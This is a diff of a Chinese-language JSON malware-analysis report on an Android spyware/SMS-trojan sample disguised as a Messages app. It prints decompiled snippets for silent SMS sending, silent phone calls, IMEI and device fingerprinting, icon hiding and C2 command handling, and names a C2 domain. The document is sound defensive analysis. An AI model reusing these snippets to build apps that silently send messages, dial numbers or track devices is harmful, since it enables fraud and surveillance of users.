@@ -6,7 +6,7 @@
     "应用名": "Пoслaние",
     "是否恶意": true,
     "风险等级": "高",
-    "分析耗时(秒)": 138.3
+    "分析耗时(秒)": 217.7
   },
   "行为列表": [
     {
@@ -28,9 +28,9 @@
           "malicious_behavior": "c2_communication",
           "behavior_type": "malicious",
           "risk_level": "高",
-          "malicious_code_snippet": "Intent intent = new Intent(\"status\");\nintent.putExtra(\"id\", str3);\nintent.putExtra(\"command\", i);\nb.a(str, str2, PendingIntent.getBroadcast(context, 0, intent, 134217728));\nString stringExtra = intent.getStringExtra(\"body\");\nint intExtra = intent.getIntExtra(\"type\", 0);\nint intExtra2 = intent.getIntExtra(\"waitrun\", 0);",
-          "malicious_code_snippet_context": "      }\n  \n      private static void a(Context context, String str, String str2, String str3, int i) {\n>>>         Intent intent = new Intent(\"status\");\n>>>         intent.putExtra(\"id\", str3);\n>>>         intent.putExtra(\"command\", i);\n>>>         b.a(str, str2, PendingIntent.getBroadcast(context, 0, intent, 134217728));\n>>>     }\n>>> \n>>>     private void a(Intent intent) {\n          int i;\n          boolean z = false;\n          String stringExtra = intent.getStringExtra(\"body\");",
-          "behavior_description": "该方法构造带有action为'status'的Intent，将'id'和'command'作为附加数据写入，并通过PendingIntent.getBroadcast创建广播PendingIntent后传递给b.a()方法发送出去，形成C2命令下发通道。同时另一个重载方法a(Intent)接收返回的Intent，从中提取'body'、'type'、'waitrun'等字段，解析C2服务器返回的指令体和执行类型，'waitrun'字段暗示支持延迟执行命令。整体构成命令下发→响应解析→指令执行的C2通信闭环，实现远程控制能力。",
+          "malicious_code_snippet": "Intent intent = new Intent(\"status\");\nintent.putExtra(\"id\", str3);\nintent.putExtra(\"command\", i);\nb.a(str, str2, PendingIntent.getBroadcast(context, 0, intent, 134217728));",
+          "malicious_code_snippet_context": "      }\n  \n      private static void a(Context context, String str, String str2, String str3, int i) {\n>>>         Intent intent = new Intent(\"status\");\n>>>         intent.putExtra(\"id\", str3);\n>>>         intent.putExtra(\"command\", i);\n>>>         b.a(str, str2, PendingIntent.getBroadcast(context, 0, intent, 134217728));\n      }\n  \n      private void a(Intent intent) {",
+          "behavior_description": "该方法构造一个action为\"status\"的广播Intent，携带\"id\"（任务标识）和\"command\"（命令执行状态码，与上层try/catch中返回的0/6等状态码对应），通过PendingIntent.getBroadcast包装后，连同两个字符串参数（疑似目标号码与短信内容）传入b.a()执行。结合b.a(号码, 内容, sentPendingIntent)的签名特征，其极可能是SmsManager.sendTextMessage的封装，即静默发送短信并以广播回调跟踪发送/执行结果。同文件下方代码处理\"body\"、\"type\"、\"waitrun\"等Intent额外字段，表明存在一套指令解析执行框架。在已确认的恶意样本（伪装成Messages、滥用AccessibilityService的短信木马）中，该代码用于将命令执行状态通过短信通道回传给C2控制端，实现基于短信的远程控制闭环，用户完全无感知。",
           "glm_analyzed": true
         }
       ]
@@ -63,9 +63,9 @@
           "malicious_behavior": "sms_fraud",
           "behavior_type": "malicious",
           "risk_level": "高",
-          "malicious_code_snippet": "SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);",
-          "malicious_code_snippet_context": "  \n      public static void a(String str, String str2, PendingIntent pendingIntent) {\n          try {\n>>>             SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);\n          } catch (Exception e) {\n          }\n      }",
-          "behavior_description": "代码通过 SmsManager.getDefault().sendTextMessage() 静默发送短信，目标号码和短信内容均由外部参数传入，无需用户交互或确认。在恶意样本背景下，此行为通常用于发送欺诈短信或订阅扣费服务，直接造成用户经济损失。",
+          "malicious_code_snippet": "public static void a(String str, String str2, PendingIntent pendingIntent) {\n    try {\n        SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);\n    } catch (Exception e) {\n    }\n}",
+          "malicious_code_snippet_context": "          context.startService(intent);\n      }\n  \n>>>     public static void a(String str, String str2, PendingIntent pendingIntent) {\n>>>         try {\n>>>             SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);\n>>>         } catch (Exception e) {\n>>>         }\n>>>     }\n  \n      public static void b(Context context, int i, String str) {\n          JSONObject jSONObject = new JSONObject();",
+          "behavior_description": "该方法调用 SmsManager.getDefault().sendTextMessage() 静默发送短信，目标号码(str)和短信内容(str2)均由外部参数传入，无需用户确认或交互即可发送，且异常被空catch块静默吞掉以避免暴露。结合上下文（同类中存在向 http://quostpeopls.com/... C2地址上报 android_id 及指令数据的代码，且样本被厂商确认为伪装成'信息'应用、滥用AccessibilityService的间谍恶意软件），该短信发送功能的数据流向为：C2服务器下发指令/配置（含号码与内容）→ 静默调用 sendTextMessage 发送短信，典型用于订阅付费业务扣费、短信欺诈或向攻击者指定号码回传窃取的数据，直接造成用户经济损失。",
           "glm_analyzed": true
         }
       ]
@@ -92,9 +92,9 @@
           "malicious_behavior": "device_fingerprinting",
           "behavior_type": "malicious",
           "risk_level": "高",
-          "malicious_code_snippet": "jSONObject.put(\"model\", Build.MODEL);\njSONObject.put(\"android\", Build.VERSION.RELEASE);\nTelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(\"phone\");\njSONObject.put(\"cell\", telephonyManager.getNetworkOperatorName());\njSONObject.put(\"country\", telephonyManager.getNetworkCountryIso());\nstr = telephonyManager.getDeviceId();\njSONObject.put(\"imei\", str);\nb(context, 1, jSONObject.toString());",
-          "malicious_code_snippet_context": "          try {\n              jSONObject.put(\"x\", i);\n              jSONObject.put(\"ver\", \"5.0.3\");\n>>>             jSONObject.put(\"model\", Build.MODEL);\n>>>             jSONObject.put(\"android\", Build.VERSION.RELEASE);\n>>>             TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(\"phone\");\n>>>             jSONObject.put(\"cell\", telephonyManager.getNetworkOperatorName());\n>>>             jSONObject.put(\"country\", telephonyManager.getNetworkCountryIso());\n>>>             try {\n>>>                 str = telephonyManager.getDeviceId();\n>>>             } catch (Exception e) {\n                  str = \"0000000000000001\";\n              }\n              jSONObject.put(\"imei\", str);",
-          "behavior_description": "代码通过 Build.MODEL、Build.VERSION.RELEASE 获取设备型号和系统版本，通过 TelephonyManager 获取运营商名称(getNetworkOperatorName)、网络国家码(getNetworkCountryIso)以及设备IMEI标识符(getDeviceId)，将所有信息打包成JSON后调用 b(context,1,...) 发送到远程服务器，构成设备指纹采集与隐私窃取行为",
+          "malicious_code_snippet": "jSONObject.put(\"model\", Build.MODEL);\njSONObject.put(\"android\", Build.VERSION.RELEASE);\nTelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(\"phone\");\njSONObject.put(\"cell\", telephonyManager.getNetworkOperatorName());\njSONObject.put(\"country\", telephonyManager.getNetworkCountryIso());\ntry {\n    deviceId = telephonyManager.getDeviceId();\n} catch (Exception e) {\n    deviceId = \"0000000000000001\";\n}\njSONObject.put(\"imei\", deviceId);\nb(context, 1, jSONObject.toString());",
+          "malicious_code_snippet_context": "          try {\n              jSONObject.put(\"x\", i);\n              jSONObject.put(\"ver\", \"5.0.3\");\n>>>             jSONObject.put(\"model\", Build.MODEL);\n>>>             jSONObject.put(\"android\", Build.VERSION.RELEASE);\n>>>             TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(\"phone\");\n>>>             jSONObject.put(\"cell\", telephonyManager.getNetworkOperatorName());\n>>>             jSONObject.put(\"country\", telephonyManager.getNetworkCountryIso());\n>>>             try {\n>>>                 deviceId = telephonyManager.getDeviceId();\n>>>             } catch (Exception e) {\n>>>                 deviceId = \"0000000000000001\";\n>>>             }\n>>>             jSONObject.put(\"imei\", deviceId);\n>>>             b(context, 1, jSONObject.toString());\n          } catch (JSONException e2) {\n          }\n      }",
+          "behavior_description": "该代码通过 TelephonyManager 和 Build 类静默采集设备指纹：设备型号(Build.MODEL)、Android系统版本(Build.VERSION.RELEASE)、运营商名称(getNetworkOperatorName)、网络所属国家码(getNetworkCountryIso)，以及设备唯一硬件标识IMEI(getDeviceId()，获取失败时用固定值0000000000000001兜底以保证指纹仍可上报)。所有字段被组装进JSONObject后调用 b(context, 1, jSONObject.toString()) 将数据上传至远程服务器。数据流向：getDeviceId()/Build.MODEL等设备敏感标识 → JSON序列化 → 网络外传(疑似C2回传)。结合厂商报告确认该样本为伪装成'Сообщениe(信息)'、滥用AccessibilityService并隐藏自身以监控受害者的间谍类恶意软件，此指纹采集用于受控设备注册与受害者唯一标识追踪，属于隐私窃取行为。",
           "glm_analyzed": true
         }
       ]
@@ -129,7 +129,7 @@
           "risk_level": "高",
           "malicious_code_snippet": "Intent intent = new Intent(\"android.intent.action.CALL\", Uri.parse(\"tel:\" + str));\nintent.addFlags(268435456);\ncontext.startActivity(intent);",
           "malicious_code_snippet_context": "  \n      private static int b(Context context, String str) {\n          try {\n>>>             Intent intent = new Intent(\"android.intent.action.CALL\", Uri.parse(\"tel:\" + str));\n>>>             intent.addFlags(268435456);\n>>>             context.startActivity(intent);\n              return 0;\n          } catch (Exception e) {\n              return 6;",
-          "behavior_description": "代码使用 ACTION_CALL Intent 直接发起电话呼叫，无需用户交互确认。电话号码 str 作为方法参数传入，来源可能为C2服务器下发或硬编码的付费号码，直接拨打可造成用户经济损失。与 ACTION_DIAL 不同，ACTION_CALL 会跳过拨号界面直接拨号，属于静默恶意操作。",
+          "behavior_description": "该方法接收电话号码字符串str，构造ACTION_CALL意图（tel: URI）并添加FLAG_ACTIVITY_NEW_TASK（268435456）标志后直接调用startActivity()发起通话。关键点在于使用的是ACTION_CALL而非ACTION_DIAL：ACTION_DIAL仅调起拨号界面等待用户确认，而ACTION_CALL会绕过用户交互直接拨打电话（需CALL_PHONE权限）。结合该样本为已确认恶意软件（伪装成Messages应用、滥用AccessibilityService的间谍木马），且方法位于混淆类org.see.coerce.Acquit中、上下文可见JSONObject解析远程下发数据，电话号码参数极可能来自C2服务器指令，实现静默拨打高额付费号码或指定号码的话费欺诈，直接造成用户经济损失。",
           "glm_analyzed": true
         }
       ]
@@ -152,10 +152,10 @@
           "method_signature": "e(Context context)",
           "malicious_behavior": "icon_hiding",
           "behavior_type": "malicious",
-          "risk_level": "中",
+          "risk_level": "高",
           "malicious_code_snippet": "context.getPackageManager().setComponentEnabledSetting(new ComponentName(context, ShatterCompany.class), 2, 1);",
           "malicious_code_snippet_context": "      }\n  \n      public static void e(Context context) {\n>>>         context.getPackageManager().setComponentEnabledSetting(new ComponentName(context, (Class<?>) ShatterCompany.class), 2, 1);\n      }\n  \n      public static ArrayList<String[]> f(Context context) {",
-          "behavior_description": "通过 PackageManager.setComponentEnabledSetting() 将应用启动器组件 ShatterCompany 设置为禁用状态（COMPONENT_ENABLED_STATE_DISABLED=2，DONT_KILL_APP=1），使应用图标从桌面消失，实现图标隐藏。该行为使用户难以发现和卸载恶意应用，便于后续在后台持续执行恶意活动。同文件中还存在 wakeLock 保活、60秒定时闹钟重启、联系人数据窃取等恶意方法，构成完整的恶意行为链。",
+          "behavior_description": "该方法通过 PackageManager.setComponentEnabledSetting 将应用自身组件 ShatterCompany（通常为主启动 Activity）设置为 COMPONENT_ENABLED_STATE_DISABLED（参数值 2），并使用 DONT_KILL_APP（参数值 1）保证进程不被杀死，从而使应用图标从桌面启动器中消失。数据流向：应用自身启动组件 ComponentName(context, ShatterCompany.class) → setComponentEnabledSetting 禁用该组件 → 图标隐藏。结合同类中的 WakeLock 常亮保活（方法c）、60秒周期 AlarmManager 定时唤醒（方法d）以及窃取通讯录（方法f），该样本在隐藏图标后可长期驻留后台对受害者进行监控窃密，与厂商报告中'隐藏自身以监控受害者'的描述完全吻合。图标隐藏使用户难以发现和卸载应用，属于典型的恶意规避行为。",
           "glm_analyzed": true
         }
       ]
@@ -168,7 +168,7 @@
     "JADX反编译": "完整",
     "LLM语义分析": "已执行",
     "LLM交叉验证": "已执行",
-    "验证模型": "qwen3.7-plus",
+    "验证模型": "qwen3.8",
     "局限性": [
       "C2服务器.是否活跃: 需动态分析",
       "C2服务器.轮询间隔(秒): 需动态分析"
